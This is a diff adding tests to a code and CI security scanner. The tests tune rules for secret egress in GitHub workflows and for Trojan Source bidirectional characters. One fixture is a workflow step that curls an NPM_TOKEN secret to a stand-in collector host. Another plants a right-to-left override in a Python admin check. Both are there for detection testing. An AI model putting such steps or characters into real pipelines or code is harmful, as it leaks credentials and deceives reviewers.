@@ -1512,3 +1512,93 @@ class TestATestSuiteForAnImageLibraryIsMadeOfBrokenImages:
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         mismatch = [f for f in result.findings if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"]
         assert mismatch and any(f.severity >= Severity.HIGH for f in mismatch)
+
+
+class TestAnEphemeralJobTokenIsNotASecretToLeak:
+    """`SUSPECT.CI.SECRET_EGRESS.001` fired in 31% of 535 repositories, and every
+    sampled finding was an ordinary workflow: `release-milestone.yml`,
+    `upload-test-stats.yml`, `notify-on-merge.yml`, `label_stale_issues.yml`,
+    `send_release_notification.yml`.
+
+    `secrets.GITHUB_TOKEN` is not a secret the repository holds. GitHub mints it per
+    job, scopes it to that repository, and revokes it when the job ends -- there is
+    nothing to rotate and nothing that outlives the job. Using it with `curl` or `gh`
+    against the GitHub API is the most common thing in all of CI.
+
+    The rule's own notes record that it was split out of the critical rule because it
+    fired on "every pipeline publishing something with its own credential". It was
+    still doing exactly that, one severity down.
+    """
+
+    @staticmethod
+    def fires(workflow: str) -> bool:
+        from cordon_scanner.detect.config_files import RULES, ConfigDetector
+
+        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CI.SECRET_EGRESS.001")
+        raw = workflow.encode()
+        return rule.pattern.search(ConfigDetector._without_comments(raw)) is not None
+
+    def test_the_job_token_against_the_github_api_is_ordinary(self) -> None:
+        assert not self.fires(
+            "jobs:\n  notify:\n    steps:\n"
+            '      - run: curl -H "Authorization: ${{ secrets.GITHUB_TOKEN }}"'
+            " https://api.github.com/repos/x/y/issues\n"
+        )
+
+    def test_a_named_user_secret_still_fires(self) -> None:
+        """The guard: a secret the project owns, going somewhere this cannot check, is
+        the observation the rule exists to make."""
+        assert self.fires(
+            "jobs:\n  leak:\n    steps:\n"
+            '      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://collector.invalid/i\n'
+        )
+
+    def test_it_reports_below_blocking(self) -> None:
+        """What separates publishing from exfiltration is where the data goes, and the
+        rule's own message says it cannot decide that. A finding worth a reviewer's eye
+        is not a finding worth failing a build, and this shape is far too common to
+        block on -- the critical rule for a serialised secret context is untouched."""
+        from cordon_scanner.core.models import Severity
+        from cordon_scanner.detect.config_files import RULES
+
+        egress = next(r for r in RULES if r.rule_id == "SUSPECT.CI.SECRET_EGRESS.001")
+        exfil = next(r for r in RULES if r.rule_id == "MALWARE.CI.SECRET_EXFIL.001")
+        assert egress.severity <= Severity.MEDIUM
+        assert exfil.severity >= Severity.CRITICAL
+
+
+class TestATrojanSourceAttackNeedsAReader:
+    """`SUSPECT.OBFUSCATION.BIDI.001` produced 285 findings across 535 repositories,
+    and the files were DuckDB's `.parquet` test data, Bevy's `.glb` models, Wails's
+    compiled `Assets.car`, an After Effects `.aep`, an `.m4v`, a PhotoPrism `.xmp`
+    sidecar, and TensorFlow's `icu_conversion_data.c.gz.afu` -- a character-encoding
+    conversion table, which is a file whose entire purpose is to contain every
+    codepoint there is.
+
+    Trojan Source works because a REVIEWER reads one thing and a COMPILER acts on
+    another. A file nobody reviews as text cannot be attacked that way, so a
+    directional codepoint in one is a byte sequence rather than a deception.
+
+    `language is None` is the gate `_long_lines` already applied, on reasoning written
+    there years before this: a file with no identified language is data.
+    """
+
+    def test_a_data_file_is_not_an_attack(self, tmp_path) -> None:
+        (tmp_path / "fixture.parquet").write_bytes(
+            b"PAR1" + f"label{chr(0x202E)}value".encode() + b"\x00" * 64 + b"PAR1"
+        )
+        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)
+
+    def test_an_encoding_table_is_not_an_attack(self, tmp_path) -> None:
+        (tmp_path / "icu_conversion_data.c.gz.afu").write_bytes(
+            "".join(chr(c) for c in (0x202A, 0x202B, 0x202C, 0x202D, 0x202E)).encode()
+        )
+        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)
+
+    def test_source_is_still_checked(self, tmp_path) -> None:
+        """The guard. A directional override in code a human reviews is the attack,
+        and narrowing to source must not be narrowing to nothing."""
+        (tmp_path / "auth.py").write_text(
+            f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
+        )
+        assert "SUSPECT.OBFUSCATION.BIDI.001" in flagged(tmp_path)
